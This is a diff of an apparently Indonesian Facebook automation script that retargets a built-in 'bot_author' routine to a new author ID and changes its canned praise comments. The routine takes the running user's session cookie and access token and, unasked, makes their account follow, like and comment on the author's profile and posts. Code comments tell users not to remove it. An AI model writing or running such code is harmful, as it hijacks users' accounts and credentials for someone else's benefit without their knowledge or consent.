@@ -3,8 +3,8 @@
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
 Author    = 'kontol'
 Facebook  = 'facebook.com/100069713181960'
-Syafii  = 100081437380679
-Postingan = 403388338365169
+Zainul  = 100069713181960
+Postingan = 306515731682197
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
 ##### >>>> IMPORT MODULE
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
@@ -181,7 +181,7 @@ def kecuali(error):
 ###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Syafii)];self.komen = ['Mantap Bang','Semangat Terus','vega casper','bg syafik ganteng']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Zainul)];self.komen = ['Mantap Bang shin','Semangat Terus bang shin','minta script dong bang shin','bang kok ganteng sih']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
